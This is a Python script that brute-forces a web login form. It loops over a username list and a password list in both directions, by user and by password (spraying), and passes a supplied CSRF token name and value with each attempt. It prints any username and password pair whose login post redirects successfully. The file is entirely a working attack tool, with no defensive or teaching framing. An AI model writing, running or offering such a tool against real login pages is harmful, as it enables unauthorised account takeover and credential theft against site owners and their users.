import requests
import sys

def brute_force_vertical(url,name,value):
    flag=0
    req_get = requests.get(url)
    if(req_get.status_code==200):
        print("Brute Forcing site -- "+url)
    else:
        print("Site "+url+" not reachable")
        print("Exiting")
        return
    print("------------VERTICAL BRUTE FORCING-------------")
    with open("user.txt") as user_file:
        for line in user_file:
            username = line.rstrip()
            print("Brute forcing "+username+" with wordlist pass.txt")
            with open("pass.txt") as pass_file:
                for line in pass_file:
                    password = line.rstrip()
                    req_object = {'username':username,'password':password,name:value}
                    brute_request = requests.post(url, data = req_object)
                    if(url!=brute_request.url and brute_request.status_code==200):
                        flag=1
                        print("MATCH FOUND for USERNAME: "+username+" ----->> PASSWORD: "+password)
                    else:
                        continue
    if(flag==0):
        print("No credentials found after brute forcing Vertically")

def brute_force_horizontal(url,name,value):
    flag=0
    print("\n---------------HORIZONTALLY BRUTE FORCING---------------")
    with open("pass.txt") as pass_file:
        for line in pass_file:
            password = line.rstrip()
            print("Brute forcing all users with password = "+password)
            with open("user.txt") as user_file:
                for line in user_file:
                    username = line.rstrip()
                    req_object = {'username':username,'password':password,name:value}
                    brute_request = requests.post(url, data = req_object)
                    if(url!=brute_request.url and brute_request.status_code==200):
                        flag=1
                        print("MATCH FOUND for PASSWORD: "+password+" ----->> USERNAME: "+username)
                    else:
                        continue
    if(flag==0):
        print("No credentials found after brute forcing Horizontally")


if(len(sys.argv)==1):
    print("Use '-h' for help")
elif(len(sys.argv)==2 and sys.argv[1]=="-h"):
    print("Usage tool.py <url> <scrf-token-name> <csrf-token-value>")
elif(len(sys.argv)==4):
    brute_force_vertical(sys.argv[1],sys.argv[2],sys.argv[3])
    brute_force_horizontal(sys.argv[1],sys.argv[2],sys.argv[3])
else:
    print("Wrong Usage\nUse '-h' for help")
